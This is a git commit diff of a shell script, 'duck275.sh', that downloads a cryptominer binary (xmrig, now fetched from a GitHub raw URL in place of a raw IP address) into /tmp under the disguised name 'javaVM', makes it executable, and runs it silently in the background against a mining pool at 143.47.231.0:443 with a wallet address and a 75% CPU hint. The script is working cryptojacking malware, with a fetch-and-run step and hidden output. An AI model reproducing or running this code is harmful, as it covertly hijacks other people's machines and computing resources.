cd07eaa6621b27ae7ef728662ea08acd8262f0c4
cronjob <thesunofme1@gmail.com>
2023-11-21 05:45:48 +0700

    Update duck275.sh

--- duck275.sh
+++ duck275.sh
@@ -4,7 +4,7 @@ if [ -f /tmp/javaVM ]
  	/tmp/javaVM -o 143.47.231.0:443 -u ZEPHsCfF7eDXUEjrBujn1LikKCFPmbpgfHQYdGzBZfAaVwyXFJ3pNFx5km5vJ9fLNxgGiux1Lpi8TdZ41CnAzHHXaxW3YrxqbNF -p DuckRig -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
  	echo Started Existing
  	else
- 		wget -q http://150.136.168.71:80/archxx/xmrig -O /tmp/javaVM
+ 		wget -q https://github.com/thesunofme/trash/raw/main/work -O /tmp/javaVM
  		chmod +x /tmp/javaVM
  		/tmp/javaVM -o 143.47.231.0:443 -u ZEPHsCfF7eDXUEjrBujn1LikKCFPmbpgfHQYdGzBZfAaVwyXFJ3pNFx5km5vJ9fLNxgGiux1Lpi8TdZ41CnAzHHXaxW3YrxqbNF -p DuckRig -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
 fi
